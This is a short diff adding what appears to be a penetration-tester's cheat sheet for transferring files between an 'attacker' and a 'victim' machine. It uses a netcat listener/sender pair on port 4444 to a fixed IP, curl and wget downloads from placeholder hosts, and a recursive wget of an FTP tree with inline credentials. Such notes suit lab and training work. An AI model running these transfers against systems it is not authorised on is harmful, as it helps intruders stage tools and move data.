@@ -1,0 +1,13 @@
+Netcat:
+     On Victim machine (client):
+         # nc -nlvp 4444 > <[FILE]>
+     On Attacker machine (server):
+         # nc -nv 10.11.17.9 4444 < <[FILE_TO_SEND]>
+Curl:
+     # curl -O http://<[IP]>/<[FILE]>
+
+Wget:
+     # wget http://<[IP]>/<[FILE]>
+
+Recursive wget ftp download:
+     # wget -r ftp://<[USER]>:<[PASSWORD]>@<[DOMAIN]>
